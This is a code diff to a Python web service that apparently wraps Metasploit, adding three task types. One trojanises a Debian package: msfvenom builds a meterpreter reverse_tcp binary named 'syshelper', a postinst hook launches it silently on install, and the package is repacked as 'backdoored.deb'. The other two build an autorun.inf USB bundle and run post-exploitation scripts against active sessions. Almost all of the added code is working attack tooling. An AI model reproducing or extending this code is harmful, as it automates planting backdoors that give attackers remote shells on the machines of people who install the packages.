@@ -485,7 +485,7 @@ exploit
 
 # API models
 class CreateTaskRequest(BaseModel):
-    kind: str  # payload|listener|android|winexe|pdf|office
+    kind: str  # payload|listener|android|winexe|pdf|office|deb|autorun|postex
     params: Dict[str, str] = {}
 
 class TaskResponse(BaseModel):
@@ -494,7 +494,7 @@ class TaskResponse(BaseModel):
 
 @app.post("/tasks", response_model=TaskResponse)
 def create_task(req: CreateTaskRequest):
-    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office"):
+    if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office", "deb", "autorun", "postex"):
         raise HTTPException(status_code=400, detail="Unsupported kind")
     t, base = _prepare_task(req.kind, req.params)
     # seed defaults
@@ -520,6 +520,12 @@ def create_task(req: CreateTaskRequest):
             run_pdf_task(t.id, base, t.params)
         elif req.kind == "office":
             run_office_task(t.id, base, t.params)
+        elif req.kind == "deb":
+            run_deb_task(t.id, base, t.params)
+        elif req.kind == "autorun":
+            run_autorun_task(t.id, base, t.params)
+        elif req.kind == "postex":
+            run_postex_task(t.id, base, t.params)
     threading.Thread(target=runner, daemon=True).start()
     return TaskResponse(task=t)
 
@@ -551,6 +557,125 @@ def cancel_task(task_id: str):
         t.finished_at = time.time()
         _write_file(TASKS_ROOT / t.date / t.id / "logs" / "status.json", t.model_dump_json(indent=2))
     return TaskResponse(task=t)
+
+
+def run_deb_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "build.log"
+    deb_path = params.get("deb_path")
+    if not deb_path or not Path(deb_path).exists():
+        _write_file(build_log, "deb_path not provided or not found\n")
+        _finalize_task(t, base, succeeded=False, err="missing deb_path")
+        return
+    payload = params.get("payload", "linux/x86/meterpreter/reverse_tcp")
+    lhost = params.get("lhost", "127.0.0.1")
+    lport = params.get("lport", "4444")
+    output_name = params.get("output_name", "backdoored")
+    workdir = base / "temp" / "deb"
+    _ensure_dir(workdir)
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["build"] = str(build_log)
+    # Extract deb
+    rc1 = _spawn(["dpkg-deb", "-R", deb_path, str(workdir)], build_log)
+    if rc1 != 0:
+        _finalize_task(t, base, succeeded=False, err=f"dpkg-deb extract rc={rc1}")
+        return
+    # Generate payload binary
+    bin_path = workdir / "usr" / "local" / "bin" / "syshelper"
+    _ensure_dir(bin_path.parent)
+    rc2 = _spawn(["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "elf", "-o", str(bin_path)], build_log)
+    if rc2 != 0:
+        _finalize_task(t, base, succeeded=False, err=f"msfvenom rc={rc2}")
+        return
+    os.chmod(bin_path, 0o755)
+    # Create/append postinst script
+    maint = workdir / "DEBIAN"
+    _ensure_dir(maint)
+    postinst = maint / "postinst"
+    content = "#!/bin/sh\n/usr/local/bin/syshelper >/dev/null 2>&1 &\nexit 0\n"
+    if postinst.exists():
+        with open(postinst, "a") as f:
+            f.write("\n" + content)
+    else:
+        _write_file(postinst, content)
+    os.chmod(postinst, 0o755)
+    # Repack
+    out_deb = base / "output" / f"{output_name}.deb"
+    rc3 = _spawn(["dpkg-deb", "-b", str(workdir), str(out_deb)], build_log)
+    ok = (rc3 == 0 and out_deb.exists())
+    _finalize_task(t, base, succeeded=ok, err=None if ok else f"dpkg-deb build rc={rc3}")
+
+
+def run_autorun_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    bundle_dir = base / "temp" / "autorun"
+    _ensure_dir(bundle_dir)
+    build_log = base / "logs" / "build.log"
+    exe_path = params.get("exe_path")
+    exe_name = params.get("exe_name", "app4.exe")
+    # copy template files
+    for fname in ["autorun.inf", "autorun.ico"]:
+        src = WORKSPACE / "autorun" / fname
+        if src.exists():
+            shutil.copy2(src, bundle_dir / fname)
+    # pick an exe
+    if exe_path and Path(exe_path).exists():
+        shutil.copy2(exe_path, bundle_dir / exe_name)
+    else:
+        # use template app4 if present
+        app4 = WORKSPACE / "autorun" / "app4"
+        if app4.exists():
+            shutil.copy2(app4, bundle_dir / exe_name)
+    # rewrite autorun.inf to point to exe_name
+    ar = bundle_dir / "autorun.inf"
+    if ar.exists():
+        try:
+            lines = ar.read_text(errors="ignore").splitlines()
+            new = []
+            for line in lines:
+                if line.lower().startswith("open="):
+                    new.append(f"open={exe_name}")
+                else:
+                    new.append(line)
+            ar.write_text("\n".join(new))
+        except Exception:
+            pass
+    # zip bundle
+    zip_out = base / "output" / "autorun_bundle.zip"
+    shutil.make_archive(str(zip_out).rstrip(".zip"), "zip", root_dir=bundle_dir)
+    _finalize_task(t, base, succeeded=zip_out.exists(), err=None if zip_out.exists() else "autorun zip failed")
+
+
+def run_postex_task(task_id: str, base: Path, params: Dict[str, str]):
+    t = tasks[task_id]
+    with locks[task_id]:
+        t.state = TaskStatus.PREPARING
+    build_log = base / "logs" / "run.log"
+    script_name = params.get("script_name", "sysinfo.rc")
+    session_id = params.get("session_id")
+    script_path = WORKSPACE / "postexploit" / script_name
+    if not script_path.exists():
+        _write_file(build_log, f"script not found: {script_name}\n")
+        _finalize_task(t, base, succeeded=False, err="script not found")
+        return
+    # compose rc
+    rc_lines = [f"resource {script_path}"]
+    if session_id:
+        rc_lines.append(f"sessions -i {session_id}")
+    rc_text = "\n".join(rc_lines)
+    with locks[task_id]:
+        t.state = TaskStatus.RUNNING
+        t.started_at = time.time()
+        t.logs["run"] = str(build_log)
+    rc = _msfconsole_run(rc_text, build_log)
+    # Always succeed in generating logs and rc run; effectiveness depends on active session
+    _finalize_task(t, base, succeeded=True, err=None)
 
 
 if __name__ == "__main__":
